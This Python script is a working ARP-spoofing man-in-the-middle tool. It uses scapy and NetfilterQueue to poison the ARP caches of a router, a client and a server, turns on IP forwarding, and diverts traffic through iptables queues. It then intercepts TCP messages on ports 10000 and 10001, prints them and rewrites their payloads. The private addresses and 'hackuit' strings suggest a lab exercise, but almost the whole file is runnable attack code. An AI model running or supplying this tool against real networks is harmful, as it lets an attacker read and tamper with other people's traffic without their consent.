'''
Inspiration: https://www.thepythoncode.com/article/building-network-scanner-using-scapy
'''
import struct
from scapy.all import *
import os
import signal
import sys
import threading
import time
from netfilterqueue import NetfilterQueue as nfq

gateway_ip = "198.7.0.1"
packet_count = 1000

# restoring the rules after CTRL+C interrupt
def cleanup():
    print("Cleaning up iptables and disabling IP forwarding...")
    os.system("iptables -D FORWARD -j NFQUEUE --queue-num 5")
    os.system("iptables -D INPUT -j NFQUEUE --queue-num 5")
    os.system("iptables -D OUTPUT -j NFQUEUE --queue-num 5")
    os.system("iptables -D INPUT -p tcp --dport 22 -j ACCEPT")
    os.system("iptables -D FORWARD -p tcp --dport 22 -j ACCEPT")
    os.system("iptables -D OUTPUT -p tcp --dport 22 -j ACCEPT")
    os.system("sysctl -w net.ipv4.ip_forward=0")
    print("Force quitting..")
    os._exit(0)

# attaching to CTRL+C interrupt
signal.signal(signal.SIGINT, lambda sig, frame: cleanup())
signal.signal(signal.SIGTERM, lambda sig, frame: cleanup())

def init():
    # allow ssh before nfqueue rules
    os.system("iptables -I INPUT -p tcp --dport 22 -j ACCEPT")
    os.system("iptables -I FORWARD -p tcp --dport 22 -j ACCEPT")
    os.system("iptables -I OUTPUT -p tcp --dport 22 -j ACCEPT")

    # turning ip forwarding on
    print("Enabling IP forwarding..")
    os.system("sysctl -w net.ipv4.ip_forward=1")
    print("IP forwarding enabled in queue 5")
    
    # Add NFQUEUE rules for all chains to catch both directions
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 5")
    print("FORWARD chain hooked to NFQUEUE")
    os.system("iptables -I INPUT -j NFQUEUE --queue-num 5")
    print("INPUT chain hooked to NFQUEUE")
    os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 5")
    print("OUTPUT chain hooked to NFQUEUE")

    conf.verb = 0

def get_mac_address(ip_address):
    arp_request = ARP(pdst=ip_address) 
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") 
    arp_request_broadcast = broadcast / arp_request
    
    print(f"Sending ARP request for {ip_address}...")
    response = srp(arp_request_broadcast, timeout=3, verbose = False)[0]
    
    print(f"Received {len(response)} responses")

    if len(response) == 0:
        return None

    mac = response[0][1].hwsrc
    print(f"MAC address found for ip {ip_address}: {mac}")
    
    return mac

def restore_network(gateway_ip, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    os.system("iptables -D FORWARD -j NFQUEUE --queue-num 5")
    os.system("iptables -D INPUT -j NFQUEUE --queue-num 5")
    os.system("iptables -D OUTPUT -j NFQUEUE --queue-num 5")
    os.system("iptables -D INPUT -p tcp --dport 22 -j ACCEPT")
    os.system("iptables -D FORWARD -p tcp --dport 22 -j ACCEPT")
    os.system("iptables -D OUTPUT -p tcp --dport 22 -j ACCEPT")
    print("Disabling IP forwarding..")
    os.system("sysctl -w net.ipv4.ip_forward=0")
    os.kill(os.getpid(), signal.SIGTERM)

def arp_spoof(target_ip, target_mac="", gateway_ip = gateway_ip):
    try:
        if target_mac == "":
            print(f"Finding target MAC for {target_ip}..")
            target_mac = get_mac_address(target_ip)
            if not target_mac:
                print(f"MAC not found for {target_ip}!")
                return
        
        print(f"Starting ARP spoofing for {target_ip} (MAC: {target_mac})")
        while True:
            # Spoof target that we are the gateway
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
            # Spoof gateway that we are the target
            send(ARP(op=2, pdst=gateway_ip, psrc=target_ip), verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"ARP Spoofing for {target_ip} ended by keyboard interruption!")

def modify_packet(packet):
    try:
        pkt = IP(packet.get_payload())
        
        if pkt.haslayer(TCP):
            tcp_layer = pkt[TCP]
            
            if tcp_layer.dport in [10000, 10001] or tcp_layer.sport in [10000, 10001]:
                
                if tcp_layer.payload:
                    try:
                        original_payload = bytes(tcp_layer.payload)
                        original_message = original_payload.decode('utf-8', errors='ignore')
                        
                        if len(original_message) > 5 and original_message.isprintable():
                            
                            # determine direction
                            if tcp_layer.dport == 10000:
                                direction = "CLIENT->SERVER"
                                base_message = "client_hackuit"
                            elif tcp_layer.sport == 10000:
                                direction = "SERVER->CLIENT"
                                base_message = "server_hackuit"
                            elif tcp_layer.dport == 10001:
                                direction = "SERVER->CLIENT"
                                base_message = "server_hackuit"
                            else:
                                direction = "CLIENT->SERVER"
                                base_message = "client_hackuit"
                            
                            print(f"INTERCEPTED [{direction}]: {original_message}")
                            
                            # same length is important
                            original_length = len(original_message)
                            
                            if original_length <= len(base_message):
                                # if original is shorter, truncate our message
                                modified_message = base_message[:original_length]
                            else:
                                # if original is longer, pad our message
                                padding_needed = original_length - len(base_message)
                                modified_message = base_message + "-" * padding_needed
                            
                            print(f"MODIFIED TO [{direction}]: {modified_message}")
                            
                            # replace payload while keeping same length
                            tcp_layer.payload = Raw(load=modified_message.encode('utf-8'))
                            
                            # !only delete checksums, keep lengths intact
                            del pkt[IP].chksum
                            del pkt[TCP].chksum
                            
                            packet.set_payload(bytes(pkt))
                            
                    except UnicodeDecodeError:
                        pass
        
        packet.accept()
        
    except Exception as e:
        print(f"Error processing packet: {e}")
        packet.accept()


def sniff_packet():
    queue = nfq()
    try:
        print("Packet interception started..")
        print("Intercepting and modifying TCP traffic on ports 10000 and 10001...")
        queue.bind(5, modify_packet)
        queue.run()
    except KeyboardInterrupt:
        print("Packet interception ended..")
        queue.unbind()    

if __name__ == "__main__":
    print("Running Message Interceptor..")
    print("="*50)

    # initializing data
    init()

    # targets
    router_ip = "172.7.0.1"  # routers IP
    client_ip = "172.7.0.2"  # clients IP
    server_ip = "198.7.0.2"  # servers IP

    print(f"Gateway IP: {gateway_ip}")
    print(f"Router IP: {router_ip}")
    print(f"Client IP: {client_ip}")
    print(f"Server IP: {server_ip}")
    print("="*50)

    # using threads for ARP Poisoning on all targets
    poison_router = threading.Thread(target=arp_spoof, 
                                    args=(router_ip, "", gateway_ip))
    poison_server = threading.Thread(target=arp_spoof, 
                                    args=(server_ip, "", gateway_ip))
    poison_client = threading.Thread(target=arp_spoof, 
                                    args=(client_ip, "", gateway_ip))
    
    # intercepting packets in a different thread
    intercepting = threading.Thread(target=sniff_packet)

    # start ARP spoofing threads
    try:
        poison_router.daemon = True
        poison_router.start()
        time.sleep(1)
        print("Router spoofing started..")
    except Exception as e:
        print(f"Router spoofing failed: {e}")

    try:
        poison_server.daemon = True
        poison_server.start()
        time.sleep(1)
        print("Server spoofing started..")
    except Exception as e:
        print(f"Server spoofing failed: {e}")

    try:
        poison_client.daemon = True
        poison_client.start()
        time.sleep(1)
        print("Client spoofing started..")
    except Exception as e:
        print(f"Client spoofing failed: {e}")

    # start packet interception
    try:
        intercepting.daemon = True
        intercepting.start()
        print("Intercepting packets..")
        print("="*50)
        print("Attack started! Press Ctrl+C to stop.")
        print("="*50)
    except Exception as e:
        print(f"Interception failed: {e}")

    # keep the main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping attack...")
        cleanup()